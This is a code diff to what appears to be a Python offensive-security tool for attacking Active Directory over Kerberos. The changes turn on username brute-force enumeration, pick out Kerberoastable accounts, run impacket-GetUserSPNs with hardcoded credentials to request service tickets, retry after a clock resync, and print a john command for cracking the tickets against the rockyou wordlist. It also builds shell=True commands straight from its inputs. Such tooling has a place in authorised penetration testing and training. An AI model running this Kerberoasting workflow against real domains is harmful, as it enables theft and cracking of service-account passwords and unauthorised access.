@@ -4,7 +4,7 @@ import os
 
 def handle_kerberos(target, domain):
     # Try to bruteforce Usernames
-    #enum_users(target, domain)
+    enum_users(target, domain)
     # Check Kerberoast using guest creds
     check_kerberoast(target, domain)
     
@@ -48,8 +48,30 @@ def check_kerberoast(target, domain, user='ybob317', passw='ybob317'):
                 for line in output.splitlines():
                     passw_last_set = re.findall('....-..-..\s.*:.*:.*\.', line)
                     if passw_last_set:
-                        print(line)
+                        re_user = re.findall('.+\s(\w+)\s', line)
+                        if re_user: 
+                            kerberoastable_user = re_user[0]
+                            printc(f'[+] {kerberoastable_user}', BLUE)
+                cmd = f'impacket-GetUserSPNs {domain}/{user}:{passw} -dc-ip {target} -request -output tickets.txt'
+                output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
 
+                print_separator()
+                print('[!] Requesting tickets.')
+                print(f'[!] {cmd}')
+                if ('KRB_AP_ERR_SKEW' in output):
+                    printc('[-] Requesting tickets failed.', RED)
+                    print('[!] Trying to Synchronize TIME with server.')
+                    time_cmd = f'sntp -sS {domain}' 
+                    output = subprocess.check_output(time_cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
+                    if not output:
+                        printc('[-] Synchronize failed.', RED)
+                        return
+                    subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
+                if os.path.exists('tickets.txt'):
+                    printc('[+] Tickets stored in tickets.txt', GREEN)
+                    print('[!] To crack the tickets you can use john.')
+                    print('[!] john tickets.txt -w=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --rules=best64')
+                    print('[!] If the command does not work, unzip the rockyou.txt wordlist first')
     except Exception as e:
-        printc(e, RED)
+        printc(f'[-] {e}', RED)
         return
